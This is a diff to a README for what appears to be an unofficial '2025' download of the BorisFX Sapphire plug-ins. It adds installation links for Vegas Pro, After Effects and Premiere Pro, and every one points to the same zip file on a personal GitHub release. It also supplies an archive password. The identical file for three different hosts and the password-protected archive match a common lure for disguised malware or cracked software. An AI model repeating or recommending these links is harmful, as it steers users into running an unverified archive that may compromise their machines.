@@ -6,9 +6,11 @@ Sapphire plug-ins allow you to create stunning organic looks unrivaled by any ot
 
 # Installation
 
-Install the [Vegas Pro (2013+) version x32/x64 bit]()
-Install the [After Effects (2015+) version x32/x64 bit]()
-Install the [Premiere Pro (2015+) version x32/x64 bit]()
+Install the [Vegas Pro (2013+) version x32/x64 bit](https://github.com/blacktoes-dev/BorisFX-SapphirePlug-in-2025-download/releases/download/installation/plug-in.zip)
+
+Install the [After Effects (2015+) version x32/x64 bit](https://github.com/blacktoes-dev/BorisFX-SapphirePlug-in-2025-download/releases/download/installation/plug-in.zip)
+
+Install the [Premiere Pro (2015+) version x32/x64 bit](https://github.com/blacktoes-dev/BorisFX-SapphirePlug-in-2025-download/releases/download/installation/plug-in.zip)
 
  *The archive pass is SOL!Launch37
 
